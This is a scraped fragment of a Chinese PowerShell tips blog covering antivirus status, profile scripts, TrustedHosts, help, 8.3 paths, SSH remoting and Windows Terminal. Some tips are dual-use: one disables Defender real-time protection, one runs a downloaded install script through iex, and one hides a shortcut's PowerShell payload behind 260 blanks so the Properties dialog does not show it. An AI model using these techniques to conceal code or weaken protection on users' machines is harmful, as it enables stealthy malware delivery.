属性修饰枚举（表明可以设置多个位）： 1234567891011121314151617181920212223242526272829303132333435363738394041# define bit flags[Flags()] enum ProductState{ Off = 0x0000 On = 0x1000 Snoozed = 0x2000 Expired = 0x3000}[Flags()] enum SignatureStatus{ UpToDate = 0x00 OutOfDate = 0x10}[Flags()] enum ProductOwner{ NonMs = 0x000 Windows = 0x100}# define bit masks[Flags()] enum ProductFlags{ SignatureStatus = 0x00F0 ProductOwner = 0x0F00 ProductState = 0xF000}# get bits$info = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct[UInt32]$state = $info.productState# decode bit flags by masking the relevant bits, then converting[PSCustomObject]@{ ProductState = [ProductState]($state -band [ProductFlags]::ProductState) SignatureStatus = [SignatureStatus]($state -band [ProductFlags]::SignatureStatus) Owner = [ProductOwner]($state -band [ProductFlags]::ProductOwner)} 要检查位组的状态，请屏蔽与您要执行的操作相关的位，然后将这些位转换为枚举。结果是当前设置的位的明文名称。结果看起来像这样： ProductState SignatureStatus Owner ------------ --------------- ----- On UpToDate Windows 如果您使用的是 Windows 10 上内置的防病毒引擎 “Defender”，则无需使用上面的通用防病毒界面。而是使用内置的 Get-MpPreference cmdlet，它提供了更多详细信息。","link":"/2020/09/07/identifying-antivirus-engine-state/"},{"title":"PowerShell 技能连载 - 启用或禁用实时防病毒保护","text":"如果您以完全管理员权限运行，则可以使用 PowerShell 启用和禁用实时防病毒保护。当明确需要运行可能会被阻止的合法脚本时，暂时禁用实时防病毒保护有时可能会有所帮助。通常，实时保护很有价值，只有在有充分理由的情况下才应将其禁用。 要禁用实时保护，请运行以下命令： 1Set-MpPreference -DisableRealtimeMonitoring $true 要启用它，请将 $true 替换为 $false。","link":"/2020/09/09/enabling-and-disabling-realtime-antivirus-protection/"},{"title":"PowerShell 技能连载 - 使用 $Is* 变量","text":"在PowerShell 7 中，有一组新的变量都以 “Is” 开头。它们可帮助您了解脚本运行的环境： 1234567PS&gt; Get-Variable -Name is*Name Value---- -----IsCoreCLR TrueIsLinux FalseIsMacOS FalseIsWindows True 在 Windows 附带的 Windows PowerShell 中，这些变量尚不存在。这是可以理解的，因为 Windows PowerShell 是 Windows 的一部分，而且无论如何都不能跨平台兼容。 要在Windows（或任何其他受支持的平台）上运行PowerShell 7，请访问发布页面https://github.com/PowerShell/PowerShell/releases ，向下滚动到 “Assets” 标题，然后下载最适合您的安装软件包。 在 Windows PowerShell中，只需运行以下代码即可： 1iex &quot;&amp; { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI&quot; 要启动 PowerShell 7，请运行 pwsh.exe。","link":"/2020/09/11/using-is-variables/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中使用 PowerShell 7","text":"Windows 内置的 PowerShell ISE 仅能与 Windows PowerShell 一起使用，并且停留在 PowerShell 5.1 版。通常，当您想使用编辑器编写 PowerShell 7 代码时，可以使用 Visual Studio Code 和 PowerShell 扩展。 尽管如此，您仍可以使 PowerShell ISE 兼容 PowerShell 7。然后，它为 PowerShell 7 提供了丰富的 IntelliSense，并包含 PowerShell 7 中引入的所有语言功能。 为此，您可以从 PowerShell ISE 中启动本地远程会话，并指定配置名称 “powershell.7”。 1PS&gt; Enter-PSSession -ComputerName localhost -ConfigurationName powershell.7 当然，这需要满足一些先决条件： 您需要先安装 PowerShell 7，然后才能使用它。 Windows 7 并不附带 PowerShell 7。 您需要在 PowerShell 7中启用远程处理。您可以在安装期间通过选中安装对话框中的相应框来执行此操作。或者，您从提升权限的 PowerShell 7 控制台运行此命令：Enable-PSRemoting -SkipNetworkProfileCheck -Force 您可能需要在提升权限的 Windows PowerShell 中再次运行此行命令：Enable-PSRemoting -SkipNetworkProfileCheck -Force 现在您已经准备就绪，并使用上述参数运行 Enter-PSSession 时，您将远程连接到 PowerShell 7。 如果您当前的用户不是管理员，或者您使用电子邮件地址和 Microsoft 帐户登录，则需要创建一个具有管理员权限的本地用户帐户，并将其明确用于身份验证： 1PS&gt; Enter-PSSession -ComputerName localhost -ConfigurationName powershell.7 -Credential localAdminUser","link":"/2020/09/15/using-powershell-7-inside-powershell-ise/"},{"title":"PowerShell 技能连载 - 设置和清除信任的主机","text":"PowerShell 远程处理在客户端（发出命令并在服务器上进行身份验证的计算机）上维护受信任的 IP 地址和/或计算机名称的列表。此列表对您很重要，因为它控制着您如何对远程计算机进行身份验证。 默认情况下，PowerShell 仅支持 Kerberos 身份验证，因为它最安全，并且可以同时对客户端和服务器进行身份验证。但是，它需要一个 Active Directory，并且不能与 IP 地址一起使用。 12# execute PowerShell code remotelyInvoke-Command { Get-Service } -ComputerName storage2 -Credential AdminUser 在此示例中，AdminUser 必须是在 storage2 上具有适当权限才能访问的域帐户。 通过将 IP 地址和/或计算机名称添加到 TrustedHosts，您也可以使用 NTLM身份验证。这样，您可以使用本地帐户进行身份验证，并使用远程帐户访问独立系统，域外的系统以及通过IP地址指定的系统。 也允许使用通配符，因此当将 TrustedHosts 设置为 “*” 时，任何计算机都可以使用 NTLM 身份验证。但是，这并不太明智，因为现在黑客可以断开服务器并用另一台机器代替它来捕获密码，因为您不会注意到它不再是您要访问的机器。因此，仅对于您知道的位于“信任”的安全环境中的计算机，对 TrustedHosts 进行更改。 仅管理员和 WinRM 服务运行时才能访问 TrustedHosts 列表。启动提升的 PowerShell 环境，并确保 WinRM 服务正在运行： 1PS&gt; Start-Service -Name WinRM 要查看 TrustedHosts 的当前内容，请运行以下命令： 12345678PS&gt; Get-ChildItem -Path WSMan:\\localhost\\Client\\TrustedHosts WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\ClientType Name SourceOfValue Value---- ---- ------------- -----System.String TrustedHosts 默认情况下，列表为空。要重置其内容（即指定IP范围），请使用 Set-Item： 1PS&gt; Set-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Value 192.168.* -Force 要添加更多条目，请添加 -Concatenate 参数。这将添加一个不同的计算机名称： 1PS&gt; Set-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Value storage2 -Concatenate -Force 现在尝试转储更改的内容。结果是一个逗号分隔的列表，支持通配符： 12345678PS&gt; Get-ChildItem -Path WSMan:\\localhost\\Client\\TrustedHosts WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\ClientType Name SourceOfValue Value---- ---- ------------- -----System.String TrustedHosts 192.168.*,storage2 要将 TrustedHosts 还原为默认值并将其清空，请使用 Clear-Item 命令： 1PS&gt; Clear-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Force","link":"/2020/09/17/setting-and-clearing-trusted-hosts/"},{"title":"PowerShell 技能连载 - 摆脱 Get-EventLog","text":"Get-EventLog 命令可以轻松访问主要的 Windows 事件日志中的事件日志条目，但是它既不能访问许多应用程序级事件日志，也不能在PowerShell 7中使用。 如果计划在 PowerShell 7 中运行代码，则应该开始习惯其后继程序：Get-WinEvent。此cmdlet功能强大，并支持许多参数。这是一个类似于 Get-EventLog 的示例： 123Get-WinEvent -FilterHashtable @{Logname = 'System';Level=2,3} -MaxEvents 10 | Select-Object TimeCreated, LevelDisplayName, Id, ProviderName, Message | Format-Table 您的查询以哈希表的形式提交，您可以看到如何指定日志名称和想要获取的事件数量。与 Get-EventLog 相比，您现在可以指定和检索任何日志，而不仅仅是少数经典日志。您可能需要运行 Show-EventLog 来打开事件日志查看器，并发现许多可用的应用程序级别的日志。 哈希表 “Level” 键定义您要查看的事件日志条目的类型。数字越低，条目越严重。“2” 代表错误，“3”代表警告。如您所见，您可以将级别组合为逗号分隔的列表。 结果看起来像这样： TimeCreated LevelDisplayName Id ProviderName Message ----------- ---------------- -- ------------ ------- 04.08.2020 13:03:42 Warning 10016 Microsoft-Windows-DistributedCOM The Anwendungsspezifisch permission settings do... 04.08.2020 13:03:20 Error 1 MTConfig An attempt to configure the input mode of a mul... 04.08.2020 13:03:19 Error 1 MTConfig An attempt to configure the input mode of a mul... 04.08.2020 12:58:18 Error 1 MTConfig An attempt to configure the input mode of a mul... 04.08.2020 11:53:38 Error 10010 Microsoft-Windows-DistributedCOM The server Microsoft.SkypeApp_15.61.100.0_x86__... 04.08.2020 11:23:48 Error 10010 Microsoft-Windows-DistributedCOM The server microsoft.windowscommunicationsapps_... 04.08.2020 11:23:41 Error 10010 Microsoft-Windows-DistributedCOM The server Microsoft.SkypeApp_15.61.100.0_x86__... 04.08.2020 11:23:37 Warning 701 Win32k Power Manager has not requested suppression of ... 04.08.2020 11:23:37 Warning 701 Win32k Power Manager has not requested suppression of ... 04.08.2020 11:23:37 Error 10317 Microsoft-Windows-NDIS Miniport Microsoft Wi-Fi Direct Virtual Adapter...","link":"/2020/09/21/get-rid-of-get-eventlog/"},{"title":"PowerShell 技能连载 - 识别用户 Profile","text":"使用 $envuserprofile 或 $home 创建用户文件的路径时要小心。当使用了 OneDrive，文档文件夹可能已重定向到名为“ OneDrive”的子文件夹。这里有些例子： 12345678910PS&gt; $env:USERPROFILEC:\\Users\\tobiaPS&gt; $HOMEC:\\Users\\tobiaPS&gt; $profileC:\\Users\\tobia\\OneDrive\\Documents\\WindowsPowerShell\\Microsoft.PowerShellISE_profile.ps1PS&gt; 如您所见，PowerShell 配置文件脚本并不直接位于用户配置文件内的 Documents 文件夹中。而是将其改为名为 “OneDrive” 的子文件夹。 要查找当前的 Documents 文件夹，请改用 GetFolderPath()： 12PS&gt; [Environment]::GetFolderPath('MyDocuments')C:\\Users\\tobia\\OneDrive\\Documents 您甚至可以使用它来确定 OneDrive 是否重定向了用户文件： 12$redirected = [Environment]::GetFolderPath('MyDocuments') -like '*\\OneDrive\\*'$redirected 当 OneDrive 重定向文件夹时，此命令返回 $true，否则返回 $false。","link":"/2020/09/23/identifying-user-profile/"},{"title":"PowerShell 技能连载 - 使用 Profile 脚本","text":"配置文件脚本的工作方式类似于 PowerShell 中的自动启动脚本。它们不一定存在，但是如果存在，PowerShell 会在每次启动时静默执行其内容。最多有四个配置文件脚本，此行代码显示它们的路径： 1234567PS&gt; $profile | Select-Object -Property *AllUsersAllHosts : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1AllUsersCurrentHost : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Microsoft.PowerShellISE_profile.ps1CurrentUserAllHosts : C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\profile.ps1CurrentUserCurrentHost : C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\Microsoft.PowerShellISE_profile.ps1Length : 87 不必担心属性 “Length”：它是基于 $profile 是字符串这一事实的产物。PowerShell已在其中添加了四个属性，以返回受支持的配置文件的路径。 请注意，任何包含 “AllHosts” 的配置文件的路径对于所有 PowerShell 宿主都是相同的。您添加到其中的任何内容都可以在任何宿主中执行，包括 powershell.exe、PowerShell ISE、Visual Studio Code 或 PowerShell 7。包含 “CurrentHost” 的属性中的路径仅限于正在执行此行代码的宿主。 默认情况下，所有这些路径哪儿也不指向。要使用一个或多个，请确保创建了路径指向的文件。","link":"/2020/09/25/using-profile-scripts2/"},{"title":"PowerShell 技能连载 - PowerShell技能连载-检查配置文件脚本（第 1 部分）","text":"PowerShell 最多使用四个配置文件脚本。当它们存在时，PowerShell 在启动时会静默执行所有内容。 重要的是要知道存在哪个配置文件脚本（如果有），因为它们的内容会减慢 PowerShell 的启动时间，并且恶意代码可以使用它们来偷偷运行。 手动测试配置文件路径可能很麻烦。这是一行有趣的代码，可以为您完成工作： 1$profile.PSObject.Properties.Name | Where-Object { $_ -ne 'Length' } | ForEach-Object { [PSCustomObject]@{Profile=$_; Present=Test-Path $profile.$_; Path=$profile.$_}} 结果看起来像这样： Profile Present Path ------- ------- ---- AllUsersAllHosts False C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1 AllUsersCurrentHost False C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Microsoft.PowerShellISE_profile.ps1 CurrentUserAllHosts False C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\profile.ps1 CurrentUserCurrentHost True C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\Microsoft.PowerShellISE_profile.ps1","link":"/2020/09/29/checking-profile-scripts-part-1/"},{"title":"PowerShell 技能连载 - PowerShell技能连载-检查配置文件脚本（第 2 部分）","text":"在上一个脚本中，我们介绍了一一行代码，用于检查哪些配置文件脚本是存在的。但是，此解决方案仅只适用于单个宿主，因为每个宿主都使用自己的特定于宿主的配置文件路径。 这是一种更通用的方法：它列出了系统上存在的所有 PowerShell 宿主的所有配置文件路径。然后，您可以在安全性或健全性检查中检查以下文件： 12345678910111213141516171819202122232425262728293031323334353637# calculate the parent paths that can contain profile scripts$Paths = @{ AllUser_WPS = $pshome CurrentUser_WPS = Join-Path -Path ([Environment]::GetFolderPath('MyDocuments')) -ChildPath &quot;WindowsPowerShell&quot; AllUser_PS = &quot;$env:programfiles\\PowerShell\\*&quot; CurrentUser_PS = Join-Path -Path ([Environment]::GetFolderPath('MyDocuments')) -ChildPath &quot;PowerShell&quot;}# check all paths for PowerShell scripts ending on &quot;profile.ps1&quot;$Paths.Keys | ForEach-Object { $key = $_ $path = Join-Path -Path $paths[$key] -ChildPath '*profile.ps1' Get-ChildItem -Path $Path | ForEach-Object { # create a custom object with all relevant details for any # found profile script # name of PowerShell host is the prefix of profile file name if ($_.Name -like '*_*') { $hostname = $_.Name.Substring(0, $_.Name.Length-12) } else { $hostname = 'any' } [PSCustomObject]@{ # scope and PowerShell version is found in the # name of the parent folder Scope = $key.Split('_')[0] PowerShell = $key.Split('_')[1] Host = $hostname Path = $_.FullName } }} 结果报告了所有主机的现有 PowerShell 配置文件脚本，看起来可能与此类似： Scope PowerShell Host Path ----- ---------- ---- ---- CurrentUser WPS Microsoft.PowerShellISE C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\Microsoft.PowerShellISE_... CurrentUser WPS any C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\profile.ps1 CurrentUser PS Microsoft.VSCode C:\\Users\\tobia\\OneDrive\\Dokumente\\PowerShell\\Microsoft.VSCode_profile.ps1","link":"/2020/10/01/checking-profile-scripts-part-2/"},{"title":"PowerShell 技能连载 - 在没有管理员特权的情况下更新帮助","text":"在 Windows PowerShell 中，由于设计缺陷，更新帮助曾经需要管理员权限：帮助必须存储在模块所在的位置。更新 Windows 文件夹中存储的 Microsoft 模块的帮助需要对 Windows 文件夹的写权限。这就是普通用户无法下载和使用本地 PowerShell 帮助的原因。 在 PowerShell 7 中，此设计缺陷已得到纠正，现在可以将帮助安全地存储在用户配置文件中。不再需要涉及 PowerShell 模块的安装文件夹。 在 PowerShell 7 中使用 -Verbose 参数运行 Update-Help 以查看更改： 1234567891011PS&gt; Update-Help -VerboseVERBOSE: Resolving URI: &quot;https://go.microsoft.com/fwlink/?LinkId=717973&quot;VERBOSE: Your connection has been redirected to the following URI:&quot;https://pshelpprod.blob.core.windows.net/cabinets/powershell-5.1/&quot;VERBOSE: Performing the operation &quot;Update-Help&quot; on target &quot;Microsoft.PowerShell.LocalAccounts, Current Version: 5.2.0.0, Available Version: 5.2.0.0, UICulture: en-US&quot;.VERBOSE: Microsoft.PowerShell.LocalAccounts: Updated C:\\Users\\USERNAME\\Dokumente\\PowerShell\\Help\\Microsoft.PowerShell.LocalAccounts\\1.0.0.0\\en-US\\Microsoft.Powershell.LocalAccounts.dll-Help.xml. Culture en-US Version 5.2.0.0VERBOSE: Resolving URI: &quot;https://go.microsoft.com/fwlink/?linkid=2113632&quot;VERBOSE: Your connection has been redirected to the following URI: &quot;https://pshelp.blob.core.windows.net/powershell/help/7.0/Microsoft.PowerShell.Management/&quot;VERBOSE: Performing the operation &quot;Update-Help&quot; on target &quot;Microsoft.PowerShell.Management, Current Version: 7.0.1.0, Available Version: 7.0.1.0, UICulture: en-US&quot;.VERBOSE: Microsoft.PowerShell.Management: Updated C:\\Users\\USERNAME\\Dokumente\\PowerShell\\Help\\en-US\\Microsoft.PowerShell.Commands.Management.dll-Help.xml. Culture en-US Version 7.0.1.0... 要使用下载的本地帮助文件，您可以在想了解的命令后添加 “-?“ 通用参数： 12345678PS&gt; Get-Process -?NAME Get-ProcessSYNOPSIS Gets the processes that are running on the local computer or a remote computer.... 如果您之前未下载本地帮助文件，则 “-“ 参数仅显示有限的语法帮助。","link":"/2020/10/05/updating-help-without-admin-privileges/"},{"title":"PowerShell 技能连载 - 使用在线帮助（第 1 部分）","text":"PowerShell 支持本地帮助文件和联机资源。请看区别： 123456789101112131415161718# outputs help in same console window# level of detail depends on whether local help was# downloaded using Update-HelpPS C:\\&gt; help -Name Get-ProcessNAME Get-ProcessSYNOPSIS Gets the processes that are running on the local computer or a remote computer.SYNTAX Get-Process [[-Name] &lt;String[]&gt;] [-ComputerName &lt;String[]&gt;] [-FileVersionInfo] [-Module] [] ...# opens help in separate browser windowPS&gt; help -Name Get-Process -Online 默认情况下，”help“（Get-Help 的别名）将帮助信息输出到 PowerShell 的输出窗口中。指定 -Online 开关参数时，浏览器会在单独的窗口中显示帮助文件。在线帮助文​​档采用了较好的格式，并且可以通过“复制”按钮轻松地复制和粘贴示例代码。并且由于联机文档是直接从 Microsoft 加载的，因此它们始终是最新的，因此无需通过 Update-Help 下载帮助。 这就是为什么许多用户喜欢在线帮助资源而不是本地帮助的原因。 线上还有许多有用的“关于”主题。关于主题涵盖了 PowerShell 语言和引擎的各个方面。您会在此处找到所有有关主题的很好的分类：https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about","link":"/2020/10/07/using-online-help-part-1/"},{"title":"PowerShell 技能连载 - 使用在线帮助（第 2 部分）","text":"在上一个技能中，我们提到许多 PowerShell 用户更喜欢在线帮助，而不是本地下载的帮助。要默认使用联机帮助文档，请在新的 PowerShell 控制台中尝试以下操作： 12345678910111213141516171819# by default, -? opens LOCAL helpPS&gt; dir -?NAME Get-ChildItemSYNOPSIS Gets the items and child items in one or more specified locations.SYNTAX...# with this line you tell PowerShell to use the ONLINE help by defaultPS&gt; $PSDefaultParameterValues.Add(&quot;Get-Help:Online&quot;,$true)# now, whenever you use -?, the ONLINE help opens in a nicely formatted browser windowPS&gt; dir -? 使用 $PSDefaultParameterValues.Add(&quot;Get-Help:Online&quot;,$true) 命令告诉 PowerShell，Get-Help 命令应始终自动使用 -Online 参数，因此现在您始终可以获得基于浏览器的帮助。 尽管在大多数情况下这很好，但是联机帮助无法自动显示主题。如果需要显示有关主题的信息，只需使用 Get-Help 或带有 -ShowWindow 参数的帮助以显示本地帮助： 123456# this fails when help defaults to show ONLINE helpPS&gt; help about_forGet-Help : The online version of this Help topic cannot be displayed because the Internet address (URI) of the Help topic is not specified in the command code or in the help file for the command.# the -ShowWindow parameter always shows local help in an extra windowPS C:\\&gt; help about_for -ShowWindow","link":"/2020/10/09/using-online-help-part-2/"},{"title":"PowerShell 技能连载 - 识别 PowerShell 宿主和路径","text":"这是一个快速的单行代码，用于标识当前 PowerShell 宿主的完整路径： 12PS&gt; (Get-Process -Id $pid).PathC:\\Program Files\\PowerShell\\7\\pwsh.exe 该路径会告诉您当前宿主的位置，并且您可以检查代码是否在 Windows PowerShell、PowerShell 7 或PowerShell ISE 中执行。 用类似的方法，您还可以按名称查找可执行文件的路径。例如，如果您想知道 PowerShell 7 在系统上的安装位置，请尝试以下操作： 12PS C:\\&gt; (Get-Command -Name pwsh).SourceC:\\Program Files\\PowerShell\\7\\pwsh.exe 当然，如果找不到可执行文件，此行将产生错误。它必须位于 $env:path 中列出的文件夹之一中。","link":"/2020/10/13/identifying-powershell-host-and-path/"},{"title":"PowerShell 技能连载 - 将文件路径转为 8.3 格式（第 1 部分）","text":"许多年前，文件和文件夹名称最多包含 8 个字符，而这些短路径名称仍然存在。它们甚至仍然有用：短路径名永远不会包含空格和其他特殊字符，因此永远不需要引号或转义。当路径变得很长时，短路径也可能会有所帮助。 但是，如何获得默认长路径名称的短路径名称呢？一种方法是使用 Windows 脚本宿主使用的旧 COM 组件： 1234567891011# take any path# in this example, I am taking the path where Powershell 7 is installed# this requires that PowerShell 7 in fact is installed.# You can use any other path as well$path = (Get-Command -Name pwsh).Source&quot;Long path: $path&quot;# convert it to 8.3 short name$shortPath = (New-Object -ComObject Scripting.FileSystemObject).GetFile($path).ShortPath&quot;Short path: $shortPath&quot; 结果看起来像这样： Long path: C:\\Program Files\\PowerShell\\7\\pwsh.exe Short path: C:\\PROGRA~1\\POWERS~1\\7\\pwsh.exe","link":"/2020/10/15/converting-file-paths-to-8-3-part-1/"},{"title":"PowerShell 技能连载 - 将文件路径转为 8.3 格式（第 2 部分）","text":"在上一篇文章中，我们解释了如何使用旧的 COM 组件将默认的长路径名转换为短的 8.3 路径名。虽然可以偶尔进行转换，但使用 COM 组件的速度很慢且占用大量资源。 一种“清洁”的方法是直接使用 Windows API 调用。您可以通过以下方法访问将长文件路径转换为短文件路径的内部方法： 12345678910111213141516171819202122232425262728# this is the long path to convert$path = &quot;C:\\Program Files\\PowerShell\\7\\pwsh.exe&quot;# signature of internal API call$signature = '[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]public static extern int GetShortPathName(String pathName, StringBuilder shortName, int cbShortName);'# turn signature into .NET type$type = Add-Type -MemberDefinition $signature -Namespace Tools -Name Path -UsingNamespace System.Text# create empty string builder with 300-character capacity$sb = [System.Text.StringBuilder]::new(300)# ask Windows to convert long path to short path with a max of 300 characters$rv = [Tools.Path]::GetShortPathName($path, $sb, 300)# output resultif ($rv -ne 0){ $shortPath = $sb.ToString()}else{ $shortPath = $null Write-Warning &quot;Shoot. Could not convert $path&quot;}&quot;Short path: $shortPath&quot;","link":"/2020/10/19/converting-file-paths-to-8-3-part-2/"},{"title":"PowerShell 技能连载 - 测试应用程序是否存在","text":"这是一段简单的单行代码，可以测试您的系统（或任何其他应用程序）上是否安装了 PowerShell 7： 123456789101112# name of application you want to test$name = 'pwsh'# try and find the application. Discard result and errors.Get-Command -Name $name -ErrorAction Ignore | Out-Null# if there was an error, the application does not exist$exists = $?# output result&quot;Does $name exist? $exists&quot; 本质上，代码使用 Get-Command 按名称检查应用程序。 $env:path 中列出的文件夹中所安装的所有应用程序都将被识别出来。 如果将 PowerShell 7 安装在 “$env:path” 中列出的默认文件夹之一中，则上面的代码将返回 $true。如果尚未安装 PowerShell 7 或将其安装在 Get-Command 无法发现的某些专用文件夹中，它将返回 $false。","link":"/2020/10/21/test-whether-applications-exist/"},{"title":"PowerShell 技能连载 - 试用新的 SSH 远程操作","text":"如果您想试用 SSH 而非 WinRM 的新 PowerShell 远程操作替代方案，请确保先安装了 PowerShell 7。 接下来，在 PowerShell 7 中，安装以下模块： 1PS&gt; Install-Module -Name Microsoft.PowerShell.RemotingTools -Scope CurrentUser 一旦安装了模块，就可以在提升权限的 PowerShell 7 Shell 中，仅需一个调用即可启用基于 SSH 的新远程处理： 1PS&gt; Enable-SSHRemoting 安装完成后，打开提升的 PowerShell 7 Shell，然后尝试远程连接到您自己的计算机上： 1PS&gt; Enter-PSSession -HostName $env:computername -UserName remotingUser 一旦能按预期运行后，就可以使用相同的技术将跨平台从任何 PowerShell 7 实例远程连接到另一个实例。","link":"/2020/10/23/test-driving-new-ssh-remoting/"},{"title":"PowerShell 技能连载 - 以可点击图标的方式部署 PowerShell（第 1 部分）","text":"您可以使用 .lnk 文件将小型 PowerShell 解决方案部署到最终用户。以下是实现方法： 使用以下代码，然后将 $code 中的有效负载代码替换为您希望点击图标时执行的任意 PowerShell 代码。只要确保代码总数少于 4096 个字符即可。然后运行脚本。 1234567891011121314151617181920212223242526272829303132333435363738$code = { # place your code here (must be less than 4096 characters) # (this example generates a battery report on notebooks # and opens it in your default browser) $r = &quot;$env:temp\\report.html&quot; powercfg /batteryreport /duration 14 /output $r Invoke-Item -Path $r Start-Sleep -Seconds 2 Remove-Item -Path $r}# turn code into a one-liner, remove comments, escape double-quotes# NOTE: this is a very simplistic conversion. Does not support block comments# or quoted double quotes or any edgy stuff# USE with simple staight-forward code only$oneliner = $code.ToString().Trim().Replace('&quot;','\\&quot;'). Replace([Char[]]10,'').Split([Char[]]13). Trim().Where{!$_.StartsWith('#')} -join ';'# create path to a link file. It is always placed on your desktop# and named &quot;clickme.lnk&quot;$desktop = [Environment]::GetFolderPath('Desktop')$linkpath = Join-Path -Path $desktop -ChildPath 'ClickMe.lnk'# create a shortcut file$com = New-Object -ComObject WScript.Shell$shortcut = $com.CreateShortcut($linkpath)# minimize window so PowerShell won't pop up$shortcut.WindowStyle = 7# use a different icon. Adjust icon index if you want$shortcut.IconLocation = 'shell32.dll,8'# run PowerShell$shortcut.TargetPath = &quot;powershell.exe&quot;# submit code as an argument$shortcut.Arguments = &quot;-noprofile $oneliner&quot;# save and create the shortcut file$shortcut.Save() 结果是在桌面上出现一个名为 “clickme” 的图标。当双击该图标时，将运行嵌入的 PowerShell 代码。如果您没有在上面的示例中更改有效负载脚本，它将生成电池报告并将其显示在默认浏览器中。 由于有效载荷代码已嵌入图标文件中，因此您可以方便地将其地传递给其他人或进行部署。 在 $code 中调整嵌入式有效负载脚本时，需要考虑以下几点： 代码必须少于 4096 个字符 不要使用块注释，或最好删除所有注释行（以减小有效负载大小） 不要使用带引号的双引号，因为必须将双引号转义，而脚本不是很智能。它只是转义找到的所有双引号。","link":"/2020/10/27/deploy-powershell-as-clickable-icons-part-1/"},{"title":"PowerShell 技能连载 - 以可点击图标的方式部署 PowerShell（第 2 部分）","text":"在上一个技巧中，我们说明了如何在Windows资源管理器快捷方式文件中嵌入多达 4096 个字符的PowerShell代码并生成可单击的PowerShell代码。 只需右键单击链接文件并打开属性对话框，即可轻松查看嵌入的 PowerShell 代码。 通过非常简单的调整，您就可以隐藏有效的负载代码。运行以下代码以在桌面上生成示例可单击的 PowerShell 图标： 1234567891011121314151617181920212223242526272829303132333435363738394041$code = { # place your code here (must be less than 4096 characters) # (this example generates a battery report on notebooks # and opens it in your default browser) $r = &quot;$env:temp\\report.html&quot; powercfg /batteryreport /duration 14 /output $r Invoke-Item -Path $r Start-Sleep -Seconds 2 Remove-Item -Path $r}# turn code into a one-liner, remove comments, escape double quotes# NOTE: this is a very simplistic conversion. Does not support block comments# or quoted double quotes or any edgy stuff# USE with simple staight-forward code only$oneliner = $code.ToString().Trim().Replace('&quot;','\\&quot;').Replace([Char[]]10,''). Split([Char[]]13).Trim().Where{!$_.StartsWith('#')} -join ';'# create path to a link file. It is always placed on your desktop# and named &quot;clickme.lnk&quot;$desktop = [Environment]::GetFolderPath('Desktop')$linkpath = Join-Path -Path $desktop -ChildPath 'ClickMe.lnk'# create a blank string of 260 chars$blanker = &quot; &quot; * 260# create a shortcut file$com = New-Object -ComObject WScript.Shell$shortcut = $com.CreateShortcut($linkpath)# minimize window so PowerShell won't pop up$shortcut.WindowStyle = 7# use a different icon. Adjust icon index if you want$shortcut.IconLocation = 'shell32.dll,8'# run PowerShell$shortcut.TargetPath = &quot;powershell.exe&quot;# submit code as an argument and prepend with a blank string# so payload is hidden in the properties dialog$shortcut.Arguments = &quot;$blanker-noprofile $oneliner&quot;# save and create the shortcut file$shortcut.Save() 当您双击桌面上的 “clickme” 图标时，嵌入的负载代码将运行并创建电池报告，然后将其显示在默认浏览器中。 右键单击图标并选择“属性”时，将不会显示嵌入式 PowerShell 代码。该对话框仅显示powershell.exe的路径，但不显示任何参数。 这是通过在参数前面加上 260 个空白字符来实现的。快捷方式文件最多支持 4096 个字符的命令行，而 Windows 资源管理器及其对话框仅显示前 260 个字符。要查看嵌入式有效负载，用户必须使用上面的 PowerShell 代码以编程方式读取快捷方式文件并转储 arguments 属性。","link":"/2020/10/29/deploy-powershell-as-clickable-icons-part-2/"},{"title":"PowerShell 技能连载 - 彻底删除 AD 对象","text":"许多 Active Directory 对象都受到保护，无法删除。尝试删除它们时，会出现错误，从而防止您意外删除无法还原的用户帐户。 当然，这可以防止您合法删除甚至将对象移动到新的 OU。 若要确定是否防止意外删除 AD 对象，请使用以下命令： 1Get-ADObject ‹DN of object› -Properties ProtectedFromAccidentalDeletion 要关闭保护，即在您计划移动或删除对象时，请将属性设置为 $false： 1Set-ADObject ‹DN of object› -ProtectedFromAccidentalDeletion $false","link":"/2020/11/02/permanently-deleting-ad-objects/"},{"title":"PowerShell 技能连载 - 为任何用户启动 Windows 终端","text":"在 Windows 10 上，任何 PowerShell 用户都可以使用一个很棒的新工具：Windows Terminal。它使您可以同时使用多个 PowerShell 和其他控制台选项卡，并且可以混合使用 Windows PowerShell、PowerShell 7 和 Azure Cloud Shell 控制台。您可以从 Microsoft Store 安装Windows Terminal。 由于 Windows Terminal 是一个“应用程序”，因此始终以为每个用户独立安装。只有事先为该用户安装了该应用程序，才可以通过其可执行文件 wt.exe 启动它。 启动 Windows Terminal 的另一种方法是以下命令： 1start shell:appsFolder\\Microsoft.WindowsTerminal_8wekyb3d8bbwe!App 如果此调用不能帮助您从其他用户帐户启动 Windows Terminal，那么在即将发布的技能中，我们将介绍如何将应用程序转变为不再由 Windows 管理的便携式应用程序。取而代之的是，您可以用任何用户（包括高级帐户）运行它。敬请关注。","link":"/2020/11/04/launching-windows-terminal-for-any-user/"},{"title":"PowerShell 技能连载 - 将 Windows Terminal 变成便携式应用程序","text":"在 Windows 10 上，任何 PowerShell 用户都可以使用一个很棒的新工具：Windows Terminal。它使您可以同时使用多个 PowerShell 和其他控制台选项卡，并且可以混合使用 Windows PowerShell、PowerShell 7 和 Azure CloudShell 控制台。您可以从 Microsoft Store 安装 Windows Terminal。 与任何应用程序一样，Windows Terminal 由 Windows 管理，可以随时更新。而且它总是“按用户”安装。 